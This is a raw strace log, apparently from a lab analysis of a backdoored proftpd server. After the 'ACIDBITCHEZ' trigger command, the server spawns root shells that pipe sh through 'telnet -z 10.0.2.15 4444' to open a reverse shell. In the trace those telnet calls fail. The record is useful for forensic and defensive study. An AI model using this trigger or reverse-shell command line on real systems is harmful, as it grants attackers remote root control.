+4649  [00c66b3e] fstat64(7, {st_mode=S_IFREG|0755, st_size=1405508, ...}) = 0
+4649  [00c66df3] mmap2(NULL, 1415592, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 7, 0) = 0x773000
+4649  [00c66e74] mprotect(0x8c6000, 4096, PROT_NONE) = 0
+4649  [00c66df3] mmap2(0x8c7000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 7, 0x153) = 0x8c7000
+4649  [00c66df3] mmap2(0x8ca000, 10664, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x8ca000
+4649  [00c66bad] close(7)               = 0
+4649  [00c66df3] mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb77a2000
+4649  [00c52cdf] set_thread_area({entry_number:-1 -> 6, base_addr:0xb77a28d0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
+4649  [00c66e74] mprotect(0x8c7000, 8192, PROT_READ) = 0
+4649  [00c66e74] mprotect(0x805c000, 4096, PROT_READ) = 0
+4649  [00c66e74] mprotect(0xc6c000, 4096, PROT_READ) = 0
+4649  [00c66e31] munmap(0xb77a3000, 56298) = 0
+4649  [002d2422] getpid()               = 4649
+4649  [002d2422] rt_sigaction(SIGCHLD, {SIG_DFL, [CHLD], SA_RESTART}, {SIG_DFL, [], 0}, 8) = 0
+4649  [002d2422] geteuid32()            = 0
+4649  [002d2422] brk(0)                 = 0x96b9000
+4649  [002d2422] brk(0x96da000)         = 0x96da000
+4649  [002d2422] getppid()              = 4642
+4649  [002d2422] stat64("/", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+4649  [002d2422] stat64(".", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+4649  [002d2422] rt_sigaction(SIGINT, NULL, {SIG_DFL, [], 0}, 8) = 0
+4649  [002d2422] rt_sigaction(SIGINT, {0x804f636, ~[RTMIN RT_1], 0}, NULL, 8) = 0
+4649  [002d2422] rt_sigaction(SIGQUIT, NULL, {SIG_DFL, [], 0}, 8) = 0
+4649  [002d2422] rt_sigaction(SIGQUIT, {SIG_DFL, ~[RTMIN RT_1], 0}, NULL, 8) = 0
+4649  [002d2422] rt_sigaction(SIGTERM, NULL, {SIG_DFL, [], 0}, 8) = 0
+4649  [002d2422] rt_sigaction(SIGTERM, {SIG_DFL, ~[RTMIN RT_1], 0}, NULL, 8) = 0
+4649  [002d2422] clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb77a2938) = 4650
+4649  [002d2422] wait4(-1,  <unfinished ...>
+4650  [002d2422] stat64("/usr/local/sbin/sleep", 0xbff82080) = -1 ENOENT (No such file or directory)
+4650  [002d2422] stat64("/usr/local/bin/sleep", 0xbff82080) = -1 ENOENT (No such file or directory)
+4650  [002d2422] stat64("/usr/sbin/sleep", 0xbff82080) = -1 ENOENT (No such file or directory)
+4650  [002d2422] stat64("/usr/bin/sleep", 0xbff82080) = -1 ENOENT (No such file or directory)
+4650  [002d2422] stat64("/sbin/sleep", 0xbff82080) = -1 ENOENT (No such file or directory)
+4650  [002d2422] stat64("/bin/sleep", {st_mode=S_IFREG|0755, st_size=30224, ...}) = 0
+4650  [002d2422] pipe([7, 8])           = 0
+4650  [002d2422] clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb77a2938) = 4651
+4650  [002d2422] close(8)               = 0
+4650  [002d2422] stat64("/usr/local/sbin/telnet", 0xbff82080) = -1 ENOENT (No such file or directory)
+4650  [002d2422] stat64("/usr/local/bin/telnet", 0xbff82080) = -1 ENOENT (No such file or directory)
+4650  [002d2422] stat64("/usr/sbin/telnet", 0xbff82080) = -1 ENOENT (No such file or directory)
+4650  [002d2422] stat64("/usr/bin/telnet", {st_mode=S_IFREG|0755, st_size=80056, ...}) = 0
+4650  [002d2422] pipe([8, 9])           = 0
+4650  [002d2422] clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb77a2938) = 4652
+4650  [002d2422] close(7)               = 0
+4650  [002d2422] close(9)               = 0
+4650  [002d2422] pipe([7, 9])           = 0
+4650  [002d2422] clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb77a2938) = 4653
+4650  [002d2422] close(8)               = 0
+4650  [002d2422] close(9)               = 0
+4650  [002d2422] clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb77a2938) = 4654
+4650  [002d2422] close(7)               = 0
+4650  [002d2422] close(-1)              = -1 EBADF (Bad file descriptor)
+4650  [002d2422] exit_group(0)          = ?
+4649  [002d2422] <... wait4 resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 4650
+4649  [002d2422] --- SIGCHLD (Child exited) @ 0 (0) ---
+4649  [002d2422] exit_group(0)          = ?
+4642  [00b57422] <... wait4 resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 4649
+4642  [00b57422] --- SIGCHLD (Child exited) @ 0 (0) ---
+4642  [00b57422] dup2(10, 1)            = 1
+4642  [00b57422] close(10)              = 0
+4642  [00b57422] close(2)               = 0
+4642  [00b57422] read(0, "", 8192)      = 0
+4642  [00b57422] exit_group(0)          = ?
+4641  [00110422] <... wait4 resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 4642
+4641  [00110422] --- SIGCHLD (Child exited) @ 0 (0) ---
+4641  [00110422] clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb78b0938) = 4655
+4641  [00110422] wait4(-1,  <unfinished ...>
+4654  [002d2422] rt_sigaction(SIGINT, {SIG_IGN, [INT], SA_RESTART}, {0x804f636, ~[KILL STOP RTMIN RT_1], 0}, 8) = 0
+4654  [002d2422] rt_sigaction(SIGQUIT, {SIG_IGN, [QUIT], SA_RESTART}, {SIG_DFL, ~[KILL STOP RTMIN RT_1], 0}, 8) = 0
+4654  [002d2422] dup2(7, 0)             = 0
+4654  [002d2422] close(7)               = 0
+4654  [002d2422] open("/dev/null", O_WRONLY|O_CREAT|O_TRUNC|O_LARGEFILE, 0666) = 7
+4655  [00110422] execve("/sbin/sh", ["/sbin/sh"], [/* 17 vars */] <unfinished ...>
+4654  [002d2422] fcntl64(1, F_DUPFD, 10) = 10
+4654  [002d2422] close(1)               = 0
+4654  [002d2422] fcntl64(10, F_SETFD, FD_CLOEXEC) = 0
+4654  [002d2422] dup2(7, 1)             = 1
+4654  [002d2422] close(7)               = 0
+4654  [002d2422] fcntl64(2, F_DUPFD, 10) = 11
+4654  [002d2422] close(2)               = 0
+4654  [002d2422] fcntl64(11, F_SETFD, FD_CLOEXEC) = 0
+4654  [002d2422] dup2(1, 2 <unfinished ...>
+4655  [00110422] <... execve resumed> ) = -1 ENOENT (No such file or directory)
+4654  [002d2422] <... dup2 resumed> )   = 2
+4654  [002d2422] execve("/usr/bin/telnet", ["telnet", "-z", "10.0.2.15", "4444"], [/* 17 vars */] <unfinished ...>
+4655  [00110422] write(2, "sh: ", 4 <unfinished ...>
+4654  [005c2850] <... execve resumed> ) = 0
+4655  [00110422] <... write resumed> )  = -1 EBADF (Bad file descriptor)
+4655  [00110422] write(2, "/sbin/sh: not found", 19) = -1 EBADF (Bad file descriptor)
+4655  [00110422] write(2, "\n", 1)      = -1 EBADF (Bad file descriptor)
+4655  [00110422] exit_group(127)        = ?
+4653  [002d2422] rt_sigaction(SIGINT, {SIG_IGN, [INT], SA_RESTART},  <unfinished ...>
+4641  [00110422] <... wait4 resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 127}], 0, NULL) = 4655
+4641  [00110422] --- SIGCHLD (Child exited) @ 0 (0) ---
+4641  [00110422] exit_group(127)        = ?
+4639  [080d2dce] <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 127}], 0) = 4641
+4639  [080b5a7f] rt_sigaction(SIGINT, {0x8048370, [INT], SA_RESTART}, NULL, 8) = 0
+4639  [080b5a7f] rt_sigaction(SIGQUIT, {0x8048370, [QUIT], SA_RESTART}, NULL, 8) = 0
+4639  [080b5b99] rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+4639  [080b5b99] --- SIGCHLD (Child exited) @ 0 (0) ---
+4639  [080eca48] select(2, NULL, [1], NULL, {60, 0}) = 1 (out [1], left {59, 999997})
+4639  [080ebaae] write(1, "502 Unknown command 'ACIDBITCHEZ"..., 35) = 35
+4639  [080eca48] select(1, [0], NULL, NULL, {60, 0}) = 1 (in [0], left {59, 999998})
+4639  [080eba4e] read(0, "", 4102)      = 0
+4639  [080ebb56] fcntl64(6, F_SETLKW64, {type=F_WRLCK, whence=SEEK_CUR, start=16, len=612}, 0x817de84) = 0
+4639  [080ee5d4] _llseek(6, 16, [16], SEEK_SET) = 0
+4639  [080ebaae] write(6, "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"..., 612) = 612
+4639  [080ee5d4] _llseek(6, 16, [16], SEEK_SET) = 0
+4639  [080ebb56] fcntl64(6, F_SETLKW64, {type=F_UNLCK, whence=SEEK_CUR, start=16, len=612}, 0x817de84) = 0
+4639  [080eb9f7] close(0)               = 0
+4639  [080eb9f7] close(1)               = 0
+4639  [080eb9f7] close(0)               = -1 EBADF (Bad file descriptor)
+4639  [080eb9f7] close(1)               = -1 EBADF (Bad file descriptor)
+4639  [080eb9f7] close(6)               = 0
+4639  [080eb9f7] close(4)               = 0
+4639  [080ed771] munmap(0xb77a2000, 4096) = 0
+4639  [080eb9f7] close(5)               = 0
+4639  [080ed771] munmap(0xb77a1000, 4096) = 0
+4639  [080cbba0] time(NULL)             = 1407444926
+4639  [080eb651] stat64("/etc/localtime", {st_mode=S_IFREG|0644, st_size=3519, ...}) = 0
+4639  [080cbba0] time(NULL)             = 1407444926
+4639  [080ee80c] send(2, "<30>Aug  7 16:55:26 proftpd[4639"..., 104, 0) = 104
+4639  [080eb9f7] close(-1)              = -1 EBADF (Bad file descriptor)
+4639  [080eb9f7] close(2)               = 0
+4639  [080d30a7] exit_group(0)          = ?
+4449  [080eca48] <... select resumed> ) = ? ERESTARTNOHAND (To be restarted)
+4449  [080eca48] --- SIGCHLD (Child exited) @ 0 (0) ---
+4449  [080b5b99] rt_sigprocmask(SIG_BLOCK, [TERM CHLD], NULL, 8) = 0
+4449  [080d2dce] waitpid(-1, NULL, WNOHANG) = 4639
+4449  [080d2dce] waitpid(-1, NULL, WNOHANG) = -1 ECHILD (No child processes)
+4449  [080b5b99] rt_sigprocmask(SIG_UNBLOCK, [TERM CHLD], NULL, 8) = 0
+4449  [080b5a7f] rt_sigaction(SIGCHLD, {0x8048530, [CHLD], SA_RESTART}, {0x8048530, [CHLD], SA_RESTART}, 8) = 0
+4449  [00d78408] sigreturn()            = ? (mask now [])
+4449  [080b5b99] rt_sigprocmask(SIG_BLOCK, [HUP INT QUIT BUS USR1 ALRM TERM CHLD IO], NULL, 8) = 0
+4449  [080eca48] select(0, NULL, NULL, NULL, {0, 200000} <unfinished ...>
+4653  [002d2422] <... rt_sigaction resumed> {0x804f636, ~[KILL STOP RTMIN RT_1], 0}, 8) = 0
+4653  [002d2422] rt_sigaction(SIGQUIT, {SIG_IGN, [QUIT], SA_RESTART}, {SIG_DFL, ~[KILL STOP RTMIN RT_1], 0}, 8) = 0
+4654  [005d6aad] brk(0 <unfinished ...>
+4653  [002d2422] close(7 <unfinished ...>
+4654  [005d6aad] <... brk resumed> )    = 0x893c000
+4653  [002d2422] <... close resumed> )  = 0
+4654  [005d7cb1] access("/etc/ld.so.nohwcap", F_OK <unfinished ...>
+4653  [002d2422] dup2(8, 0 <unfinished ...>
+4654  [005d7cb1] <... access resumed> ) = -1 ENOENT (No such file or directory)
+4653  [002d2422] <... dup2 resumed> )   = 0
+4654  [005d7df3] mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0 <unfinished ...>
+4653  [002d2422] close(8 <unfinished ...>
+4654  [005d7df3] <... mmap2 resumed> )  = 0xb772d000
+4653  [002d2422] <... close resumed> )  = 0
+4654  [005d7cb1] access("/etc/ld.so.preload", R_OK <unfinished ...>
+4653  [002d2422] dup2(9, 1 <unfinished ...>
+4654  [005d7cb1] <... access resumed> ) = -1 ENOENT (No such file or directory)
+4653  [002d2422] <... dup2 resumed> )   = 1
+4654  [005d7b74] open("/etc/ld.so.cache", O_RDONLY <unfinished ...>
+4653  [002d2422] close(9 <unfinished ...>
+4652  [002d2422] rt_sigaction(SIGINT, {SIG_IGN, [INT], SA_RESTART},  <unfinished ...>
+4654  [005d7b74] <... open resumed> )   = 7
+4653  [002d2422] <... close resumed> )  = 0
+4652  [002d2422] <... rt_sigaction resumed> {0x804f636, ~[KILL STOP RTMIN RT_1], 0}, 8) = 0
+4654  [005d7b3e] fstat64(7,  <unfinished ...>
+4653  [002d2422] fcntl64(2, F_DUPFD, 10 <unfinished ...>
+4652  [002d2422] rt_sigaction(SIGQUIT, {SIG_IGN, [QUIT], SA_RESTART},  <unfinished ...>
+4654  [005d7b3e] <... fstat64 resumed> {st_mode=S_IFREG|0644, st_size=56298, ...}) = 0
+4653  [002d2422] <... fcntl64 resumed> ) = 10
+4652  [002d2422] <... rt_sigaction resumed> {SIG_DFL, ~[KILL STOP RTMIN RT_1], 0}, 8) = 0
+4654  [005d7df3] mmap2(NULL, 56298, PROT_READ, MAP_PRIVATE, 7, 0 <unfinished ...>
+4653  [002d2422] close(2 <unfinished ...>
+4654  [005d7df3] <... mmap2 resumed> )  = 0xb771f000
+4653  [002d2422] <... close resumed> )  = 0
+4652  [002d2422] close(8 <unfinished ...>
+4654  [005d7bad] close(7 <unfinished ...>
+4653  [002d2422] fcntl64(10, F_SETFD, FD_CLOEXEC <unfinished ...>
+4652  [002d2422] <... close resumed> )  = 0
+4654  [005d7bad] <... close resumed> )  = 0
+4653  [002d2422] <... fcntl64 resumed> ) = 0
+4652  [002d2422] dup2(7, 0 <unfinished ...>
+4654  [005d7cb1] access("/etc/ld.so.nohwcap", F_OK <unfinished ...>
+4653  [002d2422] dup2(1, 2 <unfinished ...>
+4652  [002d2422] <... dup2 resumed> )   = 0
+4654  [005d7cb1] <... access resumed> ) = -1 ENOENT (No such file or directory)
+4653  [002d2422] <... dup2 resumed> )   = 2
+4652  [002d2422] close(7 <unfinished ...>
+4654  [005d7b74] open("/lib/libncurses.so.5", O_RDONLY <unfinished ...>
+4653  [002d2422] stat64("/usr/local/sbin/sh",  <unfinished ...>
+4654  [005d7b74] <... open resumed> )   = 7
+4653  [002d2422] <... stat64 resumed> 0xbff81ed0) = -1 ENOENT (No such file or directory)
+4652  [002d2422] <... close resumed> )  = 0
+4654  [005d7bf4] read(7,  <unfinished ...>
+4653  [002d2422] stat64("/usr/local/bin/sh",  <unfinished ...>
+4652  [002d2422] dup2(9, 1 <unfinished ...>
+4654  [005d7bf4] <... read resumed> "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\240\223\0\0004\0\0\0"..., 512) = 512
+4653  [002d2422] <... stat64 resumed> 0xbff81ed0) = -1 ENOENT (No such file or directory)
+4654  [005d7b3e] fstat64(7,  <unfinished ...>
+4653  [002d2422] stat64("/usr/sbin/sh",  <unfinished ...>
+4652  [002d2422] <... dup2 resumed> )   = 1
+4654  [005d7b3e] <... fstat64 resumed> {st_mode=S_IFREG|0644, st_size=223768, ...}) = 0
+4654  [005d7df3] mmap2(NULL, 227536, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 7, 0) = 0xd88000
+4654  [005d7e74] mprotect(0xdbc000, 4096, PROT_NONE) = 0
+4654  [005d7df3] mmap2(0xdbd000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 7, 0x34) = 0xdbd000
+4654  [005d7bad] close(7)               = 0
+4654  [005d7cb1] access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+4654  [005d7b74] open("/usr/lib/libstdc++.so.6", O_RDONLY) = 7
+4654  [005d7bf4] read(7, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000r\4\0004\0\0\0"..., 512) = 512
+4654  [005d7b3e] fstat64(7, {st_mode=S_IFREG|0644, st_size=975012, ...}) = 0
+4654  [005d7df3] mmap2(NULL, 1000332, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 7, 0) = 0x110000
+4654  [005d7df3] mmap2(0x1f9000, 20480, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 7, 0xe9) = 0x1f9000
+4654  [005d7df3] mmap2(0x1fe000, 25484, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x1fe000
+4654  [005d7bad] close(7)               = 0
+4654  [005d7cb1] access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+4654  [005d7b74] open("/lib/tls/i686/cmov/libm.so.6", O_RDONLY) = 7
+4654  [005d7bf4] read(7, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0`4\0\0004\0\0\0"..., 512) = 512
+4654  [005d7b3e] fstat64(7, {st_mode=S_IFREG|0644, st_size=149392, ...}) = 0
+4654  [005d7df3] mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb771e000
+4654  [005d7df3] mmap2(NULL, 151680, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 7, 0) = 0x478000
+4654  [005d7df3] mmap2(0x49c000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 7, 0x23) = 0x49c000
+4654  [005d7bad] close(7)               = 0
+4654  [005d7cb1] access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+4654  [005d7b74] open("/lib/libgcc_s.so.1", O_RDONLY) = 7
+4654  [005d7bf4] read(7, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p#\0\0004\0\0\0"..., 512) = 512
+4654  [005d7b3e] fstat64(7, {st_mode=S_IFREG|0644, st_size=120368, ...}) = 0
+4654  [005d7df3] mmap2(NULL, 123432, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 7, 0) = 0xe5b000
+4654  [005d7df3] mmap2(0xe78000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 7, 0x1c) = 0xe78000
+4654  [005d7bad] close(7)               = 0
+4654  [005d7cb1] access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+4654  [005d7b74] open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 7
+4654  [005d7bf4] read(7, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000m\1\0004\0\0\0"..., 512) = 512
+4654  [005d7b3e] fstat64(7, {st_mode=S_IFREG|0755, st_size=1405508, ...}) = 0
+4654  [005d7df3] mmap2(NULL, 1415592, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 7, 0) = 0xa58000
+4654  [005d7e74] mprotect(0xbab000, 4096, PROT_NONE) = 0
+4654  [005d7df3] mmap2(0xbac000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 7, 0x153) = 0xbac000
+4654  [005d7df3] mmap2(0xbaf000, 10664, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xbaf000
+4654  [005d7bad] close(7)               = 0
+4654  [005d7cb1] access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+4654  [005d7b74] open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 7
+4654  [005d7bf4] read(7, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@\n\0\0004\0\0\0"..., 512) = 512
+4654  [005d7b3e] fstat64(7, {st_mode=S_IFREG|0644, st_size=9736, ...}) = 0
+4654  [005d7df3] mmap2(NULL, 12408, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 7, 0) = 0x316000
+4654  [005d7df3] mmap2(0x318000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 7, 0x1) = 0x318000
+4654  [005d7bad] close(7)               = 0
+4654  [005d7df3] mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb771d000
+4654  [005d7df3] mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb771c000
+4654  [005c3cdf] set_thread_area({entry_number:-1 -> 6, base_addr:0xb771c6d0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
+4654  [005d7e74] mprotect(0x318000, 4096, PROT_READ) = 0
+4654  [005d7e74] mprotect(0xbac000, 8192, PROT_READ) = 0
+4654  [005d7e74] mprotect(0xe78000, 4096, PROT_READ) = 0
+4654  [005d7e74] mprotect(0x49c000, 4096, PROT_READ) = 0
+4654  [005d7e74] mprotect(0x1f9000, 16384, PROT_READ) = 0
+4654  [005d7e74] mprotect(0xdbd000, 8192, PROT_READ) = 0
+4654  [005d7e74] mprotect(0x805a000, 4096, PROT_READ) = 0
+4654  [005d7e74] mprotect(0x5dd000, 4096, PROT_READ) = 0
+4654  [005d7e31] munmap(0xb771f000, 56298) = 0
+4654  [007a2422] brk(0)                 = 0x893c000
+4654  [007a2422] brk(0x8961000)         = 0x8961000
+4654  [007a2422] uname({sys="Linux", node="xmenxk-laptop", ...}) = 0
+4654  [007a2422] getpid()               = 4654
+4654  [007a2422] open("/etc/resolv.conf", O_RDONLY) = 7
+4654  [007a2422] fstat64(7, {st_mode=S_IFREG|0644, st_size=105, ...}) = 0
+4654  [007a2422] mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb772c000
+4654  [007a2422] read(7, "# Generated by NetworkManager\nna"..., 4096) = 105
+4654  [007a2422] read(7, "", 4096)      = 0
+4654  [007a2422] close(7)               = 0
+4654  [007a2422] munmap(0xb772c000, 4096) = 0
+4654  [007a2422] uname({sys="Linux", node="xmenxk-laptop", ...}) = 0
+4654  [007a2422] stat64("/etc/resolv.conf", {st_mode=S_IFREG|0644, st_size=105, ...}) = 0
+4654  [007a2422] open("/etc/resolv.conf", O_RDONLY) = 7
+4654  [007a2422] fstat64(7, {st_mode=S_IFREG|0644, st_size=105, ...}) = 0
+4654  [007a2422] mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb772c000
+4654  [007a2422] read(7, "# Generated by NetworkManager\nna"..., 4096) = 105
+4654  [007a2422] read(7, "", 4096)      = 0
+4654  [007a2422] close(7)               = 0
+4654  [007a2422] munmap(0xb772c000, 4096) = 0
+4654  [007a2422] uname({sys="Linux", node="xmenxk-laptop", ...}) = 0
+4654  [007a2422] socket(PF_FILE, SOCK_STREAM|SOCK_CLOEXEC|SOCK_NONBLOCK, 0) = 7
+4654  [007a2422] connect(7, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
+4654  [007a2422] close(7)               = 0
+4654  [007a2422] socket(PF_FILE, SOCK_STREAM|SOCK_CLOEXEC|SOCK_NONBLOCK, 0) = 7
+4654  [007a2422] connect(7, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
+4654  [007a2422] close(7)               = 0
+4654  [007a2422] open("/etc/nsswitch.conf", O_RDONLY) = 7
+4654  [007a2422] fstat64(7, {st_mode=S_IFREG|0644, st_size=513, ...}) = 0
+4654  [007a2422] mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb772c000
+4654  [007a2422] read(7, "# /etc/nsswitch.conf\n#\n# Example"..., 4096) = 513
+4654  [007a2422] read(7, "", 4096)      = 0
+4654  [007a2422] close(7)               = 0
+4654  [007a2422] munmap(0xb772c000, 4096) = 0
+4654  [005d7b74] open("/etc/ld.so.cache", O_RDONLY) = 7
+4654  [005d7b3e] fstat64(7, {st_mode=S_IFREG|0644, st_size=56298, ...}) = 0
+4654  [005d7df3] mmap2(NULL, 56298, PROT_READ, MAP_PRIVATE, 7, 0) = 0xb771f000
+4654  [005d7bad] close(7)               = 0
+4654  [005d7cb1] access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+4654  [005d7b74] open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 7
+4654  [005d7bf4] read(7, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0 \32\0\0004\0\0\0"..., 512) = 512
+4654  [005d7b3e] fstat64(7, {st_mode=S_IFREG|0644, st_size=42572, ...}) = 0
+4654  [005d7df3] mmap2(NULL, 45772, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 7, 0) = 0xcd4000
+4654  [005d7df3] mmap2(0xcde000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 7, 0x9) = 0xcde000
+4654  [005d7bad] close(7)               = 0
+4654  [005d7e74] mprotect(0xcde000, 4096, PROT_READ) = 0
+4654  [005d7e31] munmap(0xb771f000, 56298) = 0
+4654  [007a2422] open("/etc/host.conf", O_RDONLY) = 7
+4654  [007a2422] fstat64(7, {st_mode=S_IFREG|0644, st_size=92, ...}) = 0
+4654  [007a2422] mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb772c000
+4654  [007a2422] read(7, "# The \"order\" line is only used "..., 4096) = 92
+4654  [007a2422] read(7, "", 4096)      = 0
+4654  [007a2422] close(7)               = 0
+4654  [007a2422] munmap(0xb772c000, 4096) = 0
+4654  [007a2422] open("/etc/hosts", O_RDONLY|O_CLOEXEC) = 7
+4654  [007a2422] fcntl64(7, F_GETFD)    = 0x1 (flags FD_CLOEXEC)
+4654  [007a2422] fstat64(7, {st_mode=S_IFREG|0644, st_size=259, ...}) = 0
+4654  [007a2422] mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb772c000
+4654  [007a2422] read(7, "127.0.0.1\tlocalhost\n127.0.1.1\txm"..., 4096) = 259
+4654  [007a2422] read(7, "", 4096)      = 0
+4654  [007a2422] close(7)               = 0
+4654  [007a2422] munmap(0xb772c000, 4096) = 0
+4654  [007a2422] rt_sigaction(SIGTSTP, {0x80536c0, [TSTP], SA_RESTART}, {SIG_DFL, [], 0}, 8) = 0
+4654  [007a2422] ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfec4508) = -1 EINVAL (Invalid argument)
+4654  [007a2422] write(2, "telnet: invalid option -- 'z'\n", 30) = 30
+4654  [007a2422] write(2, "Usage: telnet [-4] [-6] [-8] [-E"..., 121) = 121
+4654  [007a2422] close(-1)              = -1 EBADF (Bad file descriptor)
+4654  [007a2422] exit_group(1)          = ?
+4653  [002d2422] <... stat64 resumed> 0xbff81ed0) = -1 ENOENT (No such file or directory)
+4653  [002d2422] stat64("/usr/bin/sh", 0xbff81ed0) = -1 ENOENT (No such file or directory)
+4653  [002d2422] stat64("/sbin/sh", 0xbff81ed0) = -1 ENOENT (No such file or directory)
+4653  [002d2422] stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=83888, ...}) = 0
+4653  [002d2422] clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb77a2938) = 4656
+4653  [002d2422] wait4(-1,  <unfinished ...>
+4652  [002d2422] close(9)               = 0
+4652  [002d2422] execve("/usr/bin/telnet", ["telnet", "-z", "10.0.2.15", "4444"], [/* 17 vars */]) = 0
+4652  [00d4faad] brk(0)                 = 0x9440000
+4652  [00d50cb1] access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+4652  [00d50df3] mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb77e7000
+4652  [00d50cb1] access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+4652  [00d50b74] open("/etc/ld.so.cache", O_RDONLY) = 7
+4652  [00d50b3e] fstat64(7, {st_mode=S_IFREG|0644, st_size=56298, ...}) = 0
+4652  [00d50df3] mmap2(NULL, 56298, PROT_READ, MAP_PRIVATE, 7, 0) = 0xb77d9000
+4652  [00d50bad] close(7)               = 0
